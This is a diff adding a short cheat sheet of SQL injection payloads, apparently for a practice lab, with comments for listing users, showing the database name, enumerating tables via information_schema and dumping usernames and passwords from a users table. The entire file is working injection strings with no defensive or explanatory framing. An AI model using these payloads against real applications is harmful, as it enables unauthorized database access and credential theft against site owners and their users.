@@ -1,0 +1,15 @@
+//list user
+
+1' or 1=1 #
+
+//display version of db sql
+
+1' or 1=1 union SELECT null, database() #
+
+//list all table name
+
+1' or 1=1 union SELECT null,table_name FROM information_schema.tables#
+
+/list all user and password
+
+1' or 1=1 union SELECT user,password from users#
